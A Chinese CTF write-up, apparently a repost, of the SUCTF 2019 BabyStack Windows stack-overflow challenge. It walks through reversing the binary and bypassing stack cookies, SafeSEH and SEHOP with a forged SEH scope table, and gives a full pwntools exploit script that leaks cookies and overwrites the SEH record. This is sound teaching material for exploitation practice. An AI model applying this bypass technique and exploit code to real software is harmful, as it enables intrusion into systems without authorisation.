> 原文链接: https://www.anquanke.com//post/id/184648 


# suctf2019 BabyStack 详细分析&amp;safeseh绕过思路&amp;windows pwn题调试方法


                                阅读量   
                                **370620**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t01c9fd10c89e436eee.jpg)](https://p1.ssl.qhimg.com/t01c9fd10c89e436eee.jpg)



## 一.题目描述

StackOverflow on Linux is not difficult,how about it on Window?

下载到二进制文件后确实是个windows程序,看来这次出的是Windows的栈溢出利用.



## 二.逆向分析

### 1.基本逆向分析

通过在ida里面查看字符串的方式找到main函数:

[![](https://p4.ssl.qhimg.com/t011bb7ab968ced6823.png)](https://p4.ssl.qhimg.com/t011bb7ab968ced6823.png)

在ida里面通过f5查看发现,sub402482是读取用户输入的函数,但是只能输入9个字节,而缓冲区大小超出了9字节,显然无法直接溢出.那么是题目出错了么?

其实并不是.

除此之外,还有2个地方会输出main函数地址和栈地址.

再次通过查看字符串窗口发现有type flag.txt,而type相当于linux的cat:

[![](https://p0.ssl.qhimg.com/t010595af88e8a0b4a8.png)](https://p0.ssl.qhimg.com/t010595af88e8a0b4a8.png)

通过交叉引用找到访问的地方:

[![](https://p0.ssl.qhimg.com/t01bc40b2307d5a5abd.png)](https://p0.ssl.qhimg.com/t01bc40b2307d5a5abd.png)

往上翻找到函数头,再溯源可以来到main函数里面,这时候不能查看伪代码窗口,原因是调用它的地方是在异常处理函数里面,它其实不属于main函数所以f5不显示,而代码段却在main函数区域内,所以直接查看反汇编比较方便:

[![](https://p5.ssl.qhimg.com/t0140254ce65ff42311.png)](https://p5.ssl.qhimg.com/t0140254ce65ff42311.png)

在0040854C处有个花指令,通过nop掉0xe8再patch就可以了,这样在x32dbg里面可以正确反汇编

[![](https://p2.ssl.qhimg.com/t01877e991d6d9a4299.png)](https://p2.ssl.qhimg.com/t01877e991d6d9a4299.png)

### 2.确定目标函数

在loc408589查看交叉引用发现,它在一段数据结构中,这个数据结构正好是seh用到的:

[![](https://p0.ssl.qhimg.com/t015770f29822e95f09.png)](https://p0.ssl.qhimg.com/t015770f29822e95f09.png)

所以要想办法触发异常来到目标函数.

在前面可以发现一条div esi的指令,这就是触发异常的地方,只要esi为0即可触发除0异常.通过逆向分析,就是把输入的8字节经过一定计算得到esi,再减去eax,此时的eax==00408551.  通过简单的逆向求解即可得到输入(后面会有相应代码).

### 3.进入存在漏洞的函数

为了方便调试,可以把00408556的指令patch成xor esi,esi,这样无论输入什么都会触发异常,方便后续调试做题

[![](https://p1.ssl.qhimg.com/t0173afc746d5e144b8.png)](https://p1.ssl.qhimg.com/t0173afc746d5e144b8.png)

分析该函数发现sub402C70是个读取用户输入的函数,而且读入0x100字节可以触发栈溢出.当第一次运行输入的不是yes也不是no的时候会再次调用该函数输入,这时可以输入payload触发栈溢出了.当输入yes时候会让我们输入一个地址,然后程序将地址上面数据打印出来,相当于任意地址读取.所以结合栈地址和main函数地址就可以泄露栈安全cookie和程序的securitycookie,和绕过aslr.

### 4.漏洞分析

虽然上面找到了栈溢出,但是该程序存在万恶的栈安全cookie保护, 看过0day安全的童鞋都知道,Windows绕过cookie保护的思路:泄露它,溢出时不要破坏. 通过覆盖seh指针绕过,通过覆盖虚函数指针绕过.程序中也存在seh.所以我们选择覆盖seh绕过栈cookie.当然题目不会那么简单,该程序运行在windows server 2019上,开启了safeseh和sehop保护.所以需要绕过这2个保护

### 5.绕过safeseh和sehop

0day安全里面介绍的几种绕过safeseh如下:

在堆中绕过:即将异常处理函数放在堆里面,但是这道题不提供堆,而且开启了dep保护也是行不通的

在未开启safeseh模块中绕过:这个程序是静态编译的,并没有别的模块  在加载模块之外的地址:也不靠谱…

反正书上提到的都无法绕过.因为有种绕过方式没有讲到.参考&lt;&lt;加密与解密&gt;&gt;第4版,有一个叫scopetable的东西,它是在编译期间就保存在程序的静态数据区.在改函数的头部可以发现:

[![](https://p3.ssl.qhimg.com/t0193e5813df1ceb20b.png)](https://p3.ssl.qhimg.com/t0193e5813df1ceb20b.png)

stru47ACC0 存放的就是这个scopetable,内容如下:

```
.rdata:0047ACC0 stru_47ACC0     dd 0FFFFFFE4h           ; GSCookieOffset
.rdata:0047ACC0                                         ; DATA XREF: sub_407F60+5↑o
.rdata:0047ACC0                 dd 0                    ; GSCookieXOROffset ; SEH scope table for function 407F60
.rdata:0047ACC0                 dd 0FFFFFF0Ch           ; EHCookieOffset
.rdata:0047ACC0                 dd 0                    ; EHCookieXOROffset
.rdata:0047ACC0                 dd 0FFFFFFFEh           ; ScopeRecord.EnclosingLevel
.rdata:0047ACC0                 dd offset loc_408224    ; ScopeRecord.FilterFunc
.rdata:0047ACC0                 dd offset loc_40822A    ; ScopeRecord.HandlerFunc
```

我们可以发现loc40822A就是注册的异常处理函数,看看它干了什么:

[![](https://p3.ssl.qhimg.com/t01db10ea72c3a3c0f5.png)](https://p3.ssl.qhimg.com/t01db10ea72c3a3c0f5.png)

输出You ask a wrong question!后程序就退出了.那么我们可不可以伪造一个scopetable,把后面2个函数指针改为type flag指令的地址呢? 答案是肯定的. 0day书上我们可能只关注sehnext指针和下面的sehhandler.其实再下面4字节正好是指向scopetable的指针.sehhandler是系统指定的,发生异常时会调用sehhandler去处理scopetable, 然后调用scopetable的FilterFunc和HandlerFunc去真正的处理异常.sehhandler只是一个中转,用户实现的异常处理代码是在scopetable里面的,所以只要通过栈溢出覆盖掉scopetable指针为我们伪造的scopetable,就能绕过safeseh了.

### 6.漏洞利用

通过上面的分析已经可以写出完整的exp了,这里结合exp进行介绍

```
from pwn import *
import string
t = remote('121.40.159.66', 6666)
#t = remote('1.1.8.1', 9999)

def calc_esi(ret_addr):
    ret_addr = hex(ret_addr)[2:].zfill(8)
    esi = ''
    for i in ret_addr:
        if i in '1234567890':
            esi+=chr(ord(i)+3)
        elif i in string.ascii_letters:
            esi+=chr(ord(i)+55)
    return esi

print t.recvuntil('stack address = ')
stack_addr = t.recvline()[2:-2]
print stack_addr
stack_addr = int(stack_addr,16)
print t.recvuntil('main address = ')
main_addr = t.recvline()[2:-2]
print main_addr
main_addr_num = int(main_addr,16)
ret_addr = main_addr_num+0x4be3
esi = calc_esi(ret_addr)
print 'esi= ',esi
#esi = hex(ret_addr)[2:].zfill(8)
t.sendline(esi)
```

首先是触发除0异常进入目标函数.实际做题时发现随便输入8字节数据都可以导致除0异常,当时题目换了2次附件,不知道是不是这个原因.  然后是泄露需要的数据:

```
print t.recvuntil('to know more?')
t.sendline('yes')
print t.recvuntil('do you want to know?')
seh_next_addr = stack_addr-(0x19ff10-0x19fee0)
print 'seh_next_addr: ',hex(seh_next_addr)
t.sendline(str(seh_next_addr))
print t.recvuntil('value is 0x')
seh_next = t.recvuntil('rn')[:-2]
print 'seh_next: ',seh_next
seh_next = int(seh_next,16)


print t.recvuntil('to know more?rn')
t.sendline('yes')
print t.recvuntil('do you want to know?rn')
handler_addr = stack_addr-(0x19ff10-0x19fee4)
print 'handler: ',hex(handler_addr)
t.sendline(str(handler_addr))
print t.recvuntil('value is 0x')
handler = t.recvuntil('rn')[:-2]
print 'handler: ',handler
handler = int(handler,16)


print t.recvuntil('to know more?rn')
t.sendline('yes')
print t.recvuntil('do you want to know?rn')
cookie = stack_addr-(0x19ff10-0x19fed4)
print 'cookie addr: ',hex(cookie)
t.sendline(str(cookie))
print t.recvuntil('value is 0x')
cookie = t.recvuntil('rn')[:-2]
print 'cookie: ',cookie
cookie = int(cookie,16)

print t.recvuntil('to know more?rn')
t.sendline('yes')
print t.recvuntil('do you want to know?rn')
sc = 0x47C004-0x40395e+ main_addr_num
print 'sc addr: ',hex(sc)
t.sendline(str(sc))
print t.recvuntil('value is ')
sc = t.recvuntil('rn')[2:-2]

print 'sc: ',sc
sc = int(sc,16)
```

计算伪造的scope_table地址:

```
buf_addr = stack_addr-(0x19FF10-0x019FE44)
print 'buf_addr:', hex(buf_addr)
scope_addr = (buf_addr+4)^sc #这里注意一下,需要将地址和security_cookie异或一下填入栈中
print 'scope_addr: ',hex(scope_addr)
print t.recvuntil('to know more?rn')
t.sendline('1')
```

构造payload

```
getflag_addr = main_addr_num+0x0408266-0x40395E
payload = 'aaaa'
payload += 'xE4xFFxFFxFFx00x00x00x00x0CxFFxFFxFFx00x00x00x00xFExFFxFFxFF'+p32(getflag_addr)*2
payload +='x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x31x31x31x00x32x31x32x00x00x00x00x00x00x00x00x00'
payload +=p32(cookie)+'3'*8+p32(seh_next)+p32(handler)+p32(scope_addr)+p32(0)+p32(ebp)


print(len(payload))
t.sendline(payload)
print t.recvuntil('you want to know more?rn')
t.sendline('yes')
print t.recvuntil('n')
t.sendline('111')
print t.interactive()
```

### 7.windows pwn

本地测试exp以及调试方法  Windows下起pwn服务的程序:https://blog.csdn.net/vlingv/article/details/38959071  例如在本地Windows起这个pwn:    然后在Ubuntu中使用上述exp连接本机ip的9999端口的测试:

[![](https://p2.ssl.qhimg.com/t01db267ce468f9cae2.png)](https://p2.ssl.qhimg.com/t01db267ce468f9cae2.png)

在脚本运行期间可以使用x32dbg附加babystack进行调试

[![](https://p5.ssl.qhimg.com/t017df7db55090439e1.png)](https://p5.ssl.qhimg.com/t017df7db55090439e1.png)

8.最后附上本文章所有文件  链接: https://pan.baidu.com/s/1yI_kwoH2ELDhT9MlIf5tAw 提取码: wjpb
